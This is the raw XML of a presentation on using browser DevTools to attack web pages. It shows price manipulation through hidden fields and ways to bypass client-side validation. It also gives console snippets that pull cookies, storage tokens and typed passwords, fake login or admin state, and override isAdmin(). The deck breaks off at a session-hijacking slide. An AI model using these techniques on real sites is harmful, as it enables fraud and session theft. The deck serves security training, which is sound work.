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8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4158776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55181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54144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eautifier.io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lelinhtinh.github.io/de4js/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://deobfuscate.io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353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Browser Developer Tools (DevTools)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3651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Let’s explore how each section works — and what risks can arise if it is not properly secured.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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2311"/>
            <a:ext cx="92955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Introduction to Browser DevTools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181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are DevTools?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0489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Browser Developer Tools (DevTools) are built-in debugging and inspection tools available in modern web browsers (Chrome, Firefox, Edge, Safari). For security testers and hackers, DevTools provide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access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33982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HTML/CSS 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JavaScript code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Network requests/responses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Cookies and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 tokens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233982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Hidden form fields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Client-side validation logic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WebSocket communications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headers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438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Opening DevTools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4720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Keyboard Shortcuts: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237542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24516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9653" y="238887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Browser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238887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Windows/Linux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238887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macOS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895481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9653" y="30391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Chrome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03918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F12 or Ctrl+Shift+I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0391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Cmd+Option+I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3545800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9653" y="368950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Firefox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75077" y="368950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F12 or Ctrl+Shift+I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6691" y="368950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Cmd+Option+I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19612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9653" y="43398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75077" y="433982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F12 or Ctrl+Shift+I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16691" y="43398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Cmd+Option+I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4846439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9653" y="499014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Safari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375077" y="499014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Ctrl+Alt+I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16691" y="499014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Cmd+Option+I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58445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Alternative Methods:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="6609993"/>
            <a:ext cx="13042821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Right-click → "Inspect" or "Inspect Element"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Browser Menu → More Tools → Developer Tools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441"/>
            <a:ext cx="57242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Hackers Use DevTools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91045"/>
            <a:ext cx="13042821" cy="5868114"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16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6986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18423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Purpose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18423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Hackers Look For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23489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24926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Reconnaissance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24926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stack, frameworks, libraries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299930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31430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 Bypass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1430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Hidden fields, client-side validation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36496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224" y="379333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Discovery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379333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Endpoints, parameters, authentication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29994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224" y="44436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Hijacking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44436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Cookies, tokens, session IDs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95026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224" y="50939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Extraction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5824" y="50939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Sensitive data in responses, localStorage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01410" y="560058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28224" y="57442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Analysis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824" y="57442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JavaScript logic, algorithms, secrets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25090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224" y="639460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Validation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824" y="639460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Client-side checks that can be bypassed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690122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8224" y="70449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Headers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545824" y="704492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protections (CSP, HSTS, etc.)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88" y="2608183"/>
            <a:ext cx="4919305" cy="30131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41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Elements/Inspector Tab - The DOM Explorer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2411"/>
            <a:ext cx="51346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Find Here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9595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Elements tab shows the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 Object Model (DOM)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the live HTML structure of the page.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729139"/>
            <a:ext cx="4263747" cy="513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2.1 Hidden Form Fields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257" y="1317308"/>
            <a:ext cx="3082647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9257" y="1981795"/>
            <a:ext cx="13191887" cy="1247894"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 691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09017" y="1981795"/>
            <a:ext cx="13212366" cy="1247894"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 247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519" y="2135862"/>
            <a:ext cx="12801362" cy="93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type="hidden" name="price" value="999.99"&gt;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type="hidden" name="user_role" value="user"&gt;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type="hidden" name="discount" value="0"&gt;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257" y="3508891"/>
            <a:ext cx="3082647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9257" y="4173379"/>
            <a:ext cx="13191887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Right-click on hidden field → Edit as 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257" y="4765834"/>
            <a:ext cx="5821918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Real-World Example: Price Manipulation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9257" y="5616416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Original HTML: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19257" y="6146959"/>
            <a:ext cx="6345317" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13891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09017" y="6146959"/>
            <a:ext cx="6365796" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4961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519" y="6301026"/>
            <a:ext cx="5954792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type="hidden" name="price" value="999.99"&gt;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73447" y="5616416"/>
            <a:ext cx="2750344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Modified (in DevTools):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73447" y="6146959"/>
            <a:ext cx="6345317" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13891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563207" y="6146959"/>
            <a:ext cx="6365796" cy="621387"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4961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68709" y="6301026"/>
            <a:ext cx="5954792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type="hidden" name="price" value="0.01"&gt;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9257" y="7187208"/>
            <a:ext cx="13191887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Purchase $999.99 item for $0.01 if server doesn't validate!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620" y="843320"/>
            <a:ext cx="4659868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2.2 Disabled Form Elements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0620" y="1346121"/>
            <a:ext cx="2680216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50620" y="1892141"/>
            <a:ext cx="12329041" cy="1800939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141690" y="1892141"/>
            <a:ext cx="12346900" cy="1800939"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 148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320284" y="2026087"/>
            <a:ext cx="11989713" cy="1533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type="email" name="admin_email" disabled&gt;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&lt;button type="submit" disabled&gt;Submit&lt;/button&gt;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&lt;select name="user_role" disabled&gt;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&lt;option&gt;User&lt;/option&gt;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&lt;option&gt;Admin&lt;/option&gt;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&lt;/select&gt;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0620" y="3904178"/>
            <a:ext cx="2680216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0620" y="4295299"/>
            <a:ext cx="392013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 1: Remove 'disabled' attribute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150620" y="4785598"/>
            <a:ext cx="12329041" cy="1034415"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 725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690" y="4785598"/>
            <a:ext cx="12346900" cy="1034415"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 259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320284" y="4919543"/>
            <a:ext cx="11989713" cy="76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 Console tab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document.querySelector('input[name="admin_email"]').removeAttribute('disabled');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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document.querySelector('button[type="submit"]').removeAttribute('disabled');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0620" y="6031111"/>
            <a:ext cx="394430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 2: Right-click → Edit Attribute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50620" y="6521410"/>
            <a:ext cx="12329041" cy="76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Right-click on element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 "Edit Attribute"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 disabled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78" y="742117"/>
            <a:ext cx="6120051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2.3 Client-Side Validation Bypass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778" y="1311473"/>
            <a:ext cx="299477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98778" y="1949172"/>
            <a:ext cx="13232844" cy="1200150"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 698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88896" y="1949172"/>
            <a:ext cx="13252609" cy="1200150"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 249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88444" y="2098834"/>
            <a:ext cx="12853511" cy="90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type="email" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"&gt;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type="number" min="1" max="100"&gt;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type="text" maxlength="50"&gt;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8778" y="3412807"/>
            <a:ext cx="299477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Exploitation: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698778" y="4050506"/>
            <a:ext cx="13232844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 validation attributes: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778" y="4548426"/>
            <a:ext cx="13232844" cy="599599"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1398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688896" y="4548426"/>
            <a:ext cx="13252609" cy="599599"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4995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88444" y="4698087"/>
            <a:ext cx="12853511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type="text"&gt;  &lt;!-- Changed from type="email", removed required and pattern --&gt;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8778" y="5411510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Bypass Example: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98778" y="5986939"/>
            <a:ext cx="13232844" cy="1500426"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5589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8896" y="5986939"/>
            <a:ext cx="13252609" cy="1500426"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 199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888444" y="6136600"/>
            <a:ext cx="12853511" cy="120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Submit invalid email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document.querySelector('input[name="email"]').type = 'text';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document.querySelector('input[name="email"]').value = 'not-an-email';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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document.querySelector('form').submit();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722" y="882610"/>
            <a:ext cx="4920258" cy="42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2.4 Hidden Content &amp;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96722" y="1363266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96722" y="1879402"/>
            <a:ext cx="11836956" cy="1221105"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 590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388150" y="1879402"/>
            <a:ext cx="11854101" cy="1221105"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 210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559600" y="2007989"/>
            <a:ext cx="11511201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&lt;div id="admin-panel" style="display:none;"&gt;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&lt;a href="/admin/users"&gt;Manage Users&lt;/a&gt;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&lt;a href="/admin/settings"&gt;Settings&lt;/a&gt;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&lt;/div&gt;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96722" y="3295055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96722" y="3811191"/>
            <a:ext cx="11836956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Reveal hidden elements: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96722" y="4198025"/>
            <a:ext cx="11836956" cy="3148965"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2288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388150" y="4198025"/>
            <a:ext cx="11854101" cy="3148965"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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559600" y="4326612"/>
            <a:ext cx="11511201" cy="289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Method 1: Change CSS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document.getElementById('admin-panel').style.display = 'block';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Method 2: Remove display:none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document.querySelectorAll('[style*="display:none"]').forEach(el =&gt; {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el.style.display = 'block';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Method 3: Show all hidden elements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document.querySelectorAll('[hidden]').forEach(el =&gt; {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el.removeAttribute('hidden');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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1302" y="939284"/>
            <a:ext cx="4686419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2.5 Analyzing HTML Comments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1841302" y="1380173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1841302" y="1844040"/>
            <a:ext cx="10947678" cy="885111"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 752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33443" y="1844040"/>
            <a:ext cx="10963394" cy="885111"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 268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992035" y="1962983"/>
            <a:ext cx="10646212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&lt;!-- TODO: Remove debug mode before production --&gt;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&lt;!-- API Key: abc123xyz --&gt;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&lt;!-- Admin panel: /secret-admin-2024 --&gt;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41302" y="2895600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Finding Comments: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841302" y="3237309"/>
            <a:ext cx="2610683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 1: View Page Source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841302" y="3651647"/>
            <a:ext cx="10947678" cy="44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Ctrl+U (Windows/Linux) or Cmd+Option+U (macOS)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for: </a:t>
            </a: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41302" y="4264819"/>
            <a:ext cx="2348151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 2: Console Script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841302" y="4679156"/>
            <a:ext cx="10947678" cy="2611041"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2552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3443" y="4679156"/>
            <a:ext cx="10963394" cy="2611041"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 911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992035" y="4798100"/>
            <a:ext cx="10646212" cy="237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all HTML comments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comments = [];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iterator = document.createNodeIterator(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document.documentElement,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NodeFilter.SHOW_COMMENT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node;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while (node = iterator.nextNode()) {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comments.push(node.textContent);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console.log(comments);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Modifying Page Content &amp; JavaScript Execution Environment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techniques for understanding browser developer tools exploitation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711"/>
            <a:ext cx="7372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2.6 Modifying Page Content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37216"/>
            <a:ext cx="52775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 Techniques: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444353"/>
            <a:ext cx="4196358" cy="5047417"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22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678787"/>
            <a:ext cx="3160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Change Text Content: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28224" y="3288268"/>
            <a:ext cx="3727490" cy="3969067"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2556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016913" y="3288268"/>
            <a:ext cx="3750112" cy="3969067"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 90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243727" y="3458289"/>
            <a:ext cx="3296483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account balance display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document.querySelector('.balance').textContent = '$1,000,000';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Modify user role display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document.querySelector('.user-role').textContent = 'Administrator';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444353"/>
            <a:ext cx="4196358" cy="5047417"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22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1396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Inject HTML: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51396" y="3288268"/>
            <a:ext cx="3727490" cy="1428750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0085" y="3288268"/>
            <a:ext cx="3750112" cy="14287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6899" y="3458289"/>
            <a:ext cx="329648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Add fake admin button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document.body.innerHTML += 'Admin Panel';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444353"/>
            <a:ext cx="4196358" cy="5047417"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22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4568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Modify Images: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874568" y="3288268"/>
            <a:ext cx="3727490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3257" y="3288268"/>
            <a:ext cx="3750112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0071" y="3458289"/>
            <a:ext cx="329648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profile picture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document.querySelector('img.profile').src = 'https://attacker.com/fake-profile.jpg';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918" y="790218"/>
            <a:ext cx="8445937" cy="60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2.7 Finding JavaScript Event Handlers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0918" y="1815346"/>
            <a:ext cx="2918579" cy="36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80918" y="2367796"/>
            <a:ext cx="6396990" cy="1737122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71274" y="2367796"/>
            <a:ext cx="6416278" cy="1737122"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 168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5823" y="2513648"/>
            <a:ext cx="6027182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&lt;!-- Inline event handlers --&gt;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&lt;button onclick="deleteUser(123)"&gt;Delete&lt;/button&gt;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&lt;form onsubmit="return validateForm()"&gt;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&lt;input onchange="updatePrice(this.value)"&gt;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&lt;div onmouseover="trackUser()"&gt;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60112" y="1815346"/>
            <a:ext cx="2918579" cy="36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Exploitation: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560112" y="2346841"/>
            <a:ext cx="639699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View all event listeners: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60112" y="2823686"/>
            <a:ext cx="6396990" cy="1448038"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5644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50468" y="2823686"/>
            <a:ext cx="6416278" cy="1448038"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 201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45016" y="2969538"/>
            <a:ext cx="6027182" cy="115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Chrome DevTools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Right-click element → Event Listeners tab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 programmatically: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getEventListeners(document.querySelector('button'));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0112" y="4459486"/>
            <a:ext cx="639699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Modify event handlers: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60112" y="4936331"/>
            <a:ext cx="6396990" cy="2315289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50468" y="4936331"/>
            <a:ext cx="6416278" cy="2315289"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1261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45016" y="5082183"/>
            <a:ext cx="6027182" cy="2023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Remove validation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document.querySelector('form').onsubmit = null;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function behavior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document.querySelector('button').onclick = function() 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alert('Hijacked!');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847" y="2452211"/>
            <a:ext cx="5284946" cy="33251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148834"/>
            <a:ext cx="1473756" cy="426244"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 17880"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E2E3E9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1271230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1216819"/>
            <a:ext cx="9294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1665803"/>
            <a:ext cx="719066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Console Tab - JavaScript Execution Environment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3423523"/>
            <a:ext cx="719066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Do Here</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5720120"/>
            <a:ext cx="719066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Console tab allows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JavaScript execution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the context of the current page - the most powerful tool for hackers.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8892"/>
            <a:ext cx="7476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3.1 Extracting Sensitive Data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5839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Cookies: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620685"/>
            <a:ext cx="6244709" cy="4694873"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 202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620685"/>
            <a:ext cx="6267331" cy="469487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2790706"/>
            <a:ext cx="5813703" cy="435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all cookies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specific cookie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document.cookie.split(';').find(c =&gt; c.includes('session'))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Format cookies nicely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document.cookie.split(';').forEach(c =&gt; console.log(c.trim()))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Copy cookies to clipboard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copy(document.cookie)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36168" y="2365534"/>
            <a:ext cx="6571417" cy="5205174"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3138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62982" y="2592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Example Output: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62982" y="3201829"/>
            <a:ext cx="6117788" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5317"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5D6175"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651671" y="3201829"/>
            <a:ext cx="6140410" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5D6175"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7878485" y="3371850"/>
            <a:ext cx="56867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session_id=abc123xyz789;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user_id=12345;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role=admin;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auth_token=eyJhbGc...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512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Storage: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985730"/>
            <a:ext cx="4196358" cy="3278624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 290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243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all localStorage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084" y="3852505"/>
            <a:ext cx="3681770" cy="1428750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039773" y="3852505"/>
            <a:ext cx="3704392" cy="14287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1266587" y="4022527"/>
            <a:ext cx="32507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for(let i=0; i
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85730"/>
            <a:ext cx="4196358" cy="3278624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 290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3243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Get specific items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74256" y="3852505"/>
            <a:ext cx="3681770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5462945" y="3852505"/>
            <a:ext cx="3704392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5689759" y="4022527"/>
            <a:ext cx="32507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localStorage.getItem('auth_token')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localStorage.getItem('user_data')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localStorage.getItem('api_key')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985730"/>
            <a:ext cx="4196358" cy="3278624"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 290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97427" y="3243024"/>
            <a:ext cx="3017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Export all localStorage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897427" y="3852505"/>
            <a:ext cx="3681770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9886117" y="3852505"/>
            <a:ext cx="3704392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12931" y="4022527"/>
            <a:ext cx="32507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JSON.stringify(localStorage)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4277" y="972622"/>
            <a:ext cx="3177302" cy="39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Session Storage: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834277" y="1647825"/>
            <a:ext cx="21977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all sessionStorage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834277" y="2021205"/>
            <a:ext cx="5287208" cy="670084"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 995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26419" y="2021205"/>
            <a:ext cx="5302925" cy="670084"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 355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985248" y="2140267"/>
            <a:ext cx="498526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for(let i=0; i
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16535" y="1647825"/>
            <a:ext cx="220420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Common sensitive keys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516535" y="2021205"/>
            <a:ext cx="5287208" cy="886063"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 753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508677" y="2021205"/>
            <a:ext cx="5302925" cy="886063"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 268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667506" y="2140267"/>
            <a:ext cx="4985266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sessionStorage.getItem('jwt')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sessionStorage.getItem('access_token')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sessionStorage.getItem('refresh_token')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834277" y="3236902"/>
            <a:ext cx="10961846" cy="27384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34277" y="3431024"/>
            <a:ext cx="3177302" cy="39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Form Data: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1834277" y="3995023"/>
            <a:ext cx="10961846" cy="3261836"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2046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6419" y="3995023"/>
            <a:ext cx="10977562" cy="3261836"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 731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1985248" y="4114086"/>
            <a:ext cx="10659904" cy="302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all form values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document.querySelectorAll('input').forEach(input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console.log(input.name + ': ' + input.value);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password fields (even if type="password")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document.querySelectorAll('input[type="password"]').forEach(p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console.log('Password: ' + p.value);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hidden fields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document.querySelectorAll('input[type="hidden"]').forEach(h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console.log(h.name + ': ' + h.value);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99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Global Variables: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06943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 all global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816423"/>
            <a:ext cx="6244709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816423"/>
            <a:ext cx="6267331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2986445"/>
            <a:ext cx="58137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Object.keys(window).filter(key =&gt; !key.startsWith('webkit'))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37422"/>
            <a:ext cx="37453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Common sensitive variables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746903"/>
            <a:ext cx="6244709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4746903"/>
            <a:ext cx="6267331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9293" y="4916924"/>
            <a:ext cx="581370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window.user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window.config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window.API_KEY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window.authToken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window.userData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2206943"/>
            <a:ext cx="4194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Check for common frameworks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599521" y="2816423"/>
            <a:ext cx="6244709" cy="1791652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8210" y="2816423"/>
            <a:ext cx="6267331" cy="179165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815024" y="2986445"/>
            <a:ext cx="581370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window.jQuery || window.$ // jQuery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window.React // React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window.Vue // Vue.js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window.angular // Angular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9715"/>
            <a:ext cx="90813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3.2 Bypassing Client-Side Security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9220"/>
            <a:ext cx="49374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Authentication Bypass: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2363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91401"/>
            <a:ext cx="4196358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765709"/>
            <a:ext cx="3610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Check authentication state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4329827"/>
            <a:ext cx="4196358" cy="1791652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2479" y="4329827"/>
            <a:ext cx="4218980" cy="179165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009293" y="4545211"/>
            <a:ext cx="37653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localStorage.getItem('isAuthenticated')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sessionStorage.getItem('loggedIn')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window.isLoggedIn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216962" y="32363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591401"/>
            <a:ext cx="4196358" cy="3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6962" y="3765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Fake authentication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216962" y="4352568"/>
            <a:ext cx="4196358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5205651" y="4352568"/>
            <a:ext cx="4218980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5432465" y="4545211"/>
            <a:ext cx="37653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localStorage.setItem('isAuthenticated', 'true');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sessionStorage.setItem('loggedIn', 'true');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window.isLoggedIn = true;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9640133" y="32363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614142"/>
            <a:ext cx="4196358" cy="30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40133" y="3765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Reload page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640133" y="4352568"/>
            <a:ext cx="4196358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9628823" y="4352568"/>
            <a:ext cx="4218980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21" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9855637" y="4545211"/>
            <a:ext cx="3765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location.reload();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343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Role Manipulation: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44033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878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Check current role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20604" y="4487585"/>
            <a:ext cx="3893939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1009293" y="4487585"/>
            <a:ext cx="3916561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1236107" y="4657606"/>
            <a:ext cx="34629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localStorage.getItem('userRole')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window.currentUser.role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44033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3878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Change to admin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368171" y="4487585"/>
            <a:ext cx="3893939" cy="1791652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5356860" y="4487585"/>
            <a:ext cx="3916561" cy="179165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5583674" y="4657606"/>
            <a:ext cx="346293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localStorage.setItem('userRole', 'admin');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window.currentUser.role = 'admin';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744033"/>
            <a:ext cx="4347567" cy="9072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15738" y="38781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Update UI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9715738" y="4487585"/>
            <a:ext cx="3893939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16" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9704427" y="4487585"/>
            <a:ext cx="3916561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9931241" y="4657606"/>
            <a:ext cx="34629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document.querySelector('.user-role').textContent = 'Admin';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040" y="689253"/>
            <a:ext cx="6779776" cy="66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Disable Security Functions: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8040" y="1648420"/>
            <a:ext cx="7660719" cy="5891927"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1511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6217563" y="1648420"/>
            <a:ext cx="7681674" cy="5891927"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 540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429375" y="1807250"/>
            <a:ext cx="7258050" cy="557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Disable right-click protection
document.oncontextmenu = null;
// Disable copy protection
document.oncopy = null;
document.onselectstart = null;
// Disable keyboard shortcuts blocking
document.onkeydown = null;
// Enable text selection
document.body.style.userSelect = 'text';
// Remove overlay/watermark
document.querySelectorAll('.watermark, .overlay').forEach(el =&gt; el.remove());
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381"/>
            <a:ext cx="80239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3.3 Manipulating JavaScript Functions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840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Override Functions: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3204686"/>
            <a:ext cx="6244709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204686"/>
            <a:ext cx="6267331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3374708"/>
            <a:ext cx="581370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Original function
function isAdmin() {
  return user.role === 'admin';
}
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36168" y="2949535"/>
            <a:ext cx="6571417" cy="3753564"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4351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62982" y="3204686"/>
            <a:ext cx="6117788" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2937"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5D6175"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651671" y="3204686"/>
            <a:ext cx="6140410" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1049"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5D6175"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7878485" y="3374708"/>
            <a:ext cx="568678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Override to always return true
isAdmin = function() {
 return true;
}
// Or
window.isAdmin = () =&gt; true;
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8773"/>
            <a:ext cx="390132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Intercept Function Calls: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793790" y="1424226"/>
            <a:ext cx="7556421" cy="6146483"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1550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782479" y="1424226"/>
            <a:ext cx="7579043" cy="6146483"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 554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009293" y="1594247"/>
            <a:ext cx="7125414" cy="580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Save original function
const originalFetch = window.fetch;
// Override with logging
window.fetch = function(...args) {
 console.log('Fetch called:', args);
 return originalFetch.apply(this, args);
};
// Intercept AJAX requests
const originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url) {
 console.log('XHR:', method, url);
 return originalOpen.apply(this, arguments);
};
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276"/>
            <a:ext cx="6086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3.4 Extracting API Endpoints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5319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Find All API Calls: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297430"/>
            <a:ext cx="13042821" cy="5057775"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 188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297430"/>
            <a:ext cx="13065443" cy="5057775"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 67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2467451"/>
            <a:ext cx="12611814" cy="471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Search JavaScript for API patterns
let scripts = Array.from(document.scripts).map(s =&gt; s.src);
console.log('Scripts:', scripts);
// Search for common API patterns
let pageSource = document.documentElement.innerHTML;
let apiUrls = pageSource.match(/https?:\/\/[^\s"'&lt;&gt;]+api[^\s"'&lt;&gt;]*/gi);
console.log('API URLs:', apiUrls);
// Find fetch/axios calls
pageSource.match(/fetch\(['"`]([^'"`]+)['"`]/g);
pageSource.match(/axios\.(get|post|put|delete)\(['"`]([^'"`]+)['"`]/g);
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66029"/>
            <a:ext cx="43568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Monitor Network Requests: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793790" y="2331482"/>
            <a:ext cx="7556421" cy="4331970"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2199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782479" y="2331482"/>
            <a:ext cx="7579043" cy="4331970"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 785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009293" y="2501503"/>
            <a:ext cx="7125414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Log all fetch requests
const originalFetch = window.fetch;
window.fetch = function(url, options) {
 console.log('API Call:', url, options);
 return originalFetch(url, options)
 .then(response =&gt; {
 console.log('Response:', response);
 return response;
 });
};
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3.5 Session Hijacking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402449" y="61793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Steal Session Token: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02449" y="915591"/>
            <a:ext cx="7825502" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 191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396853" y="915591"/>
            <a:ext cx="7836694" cy="2483525"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6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3510201" y="1000601"/>
            <a:ext cx="7609999" cy="2313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session cookie
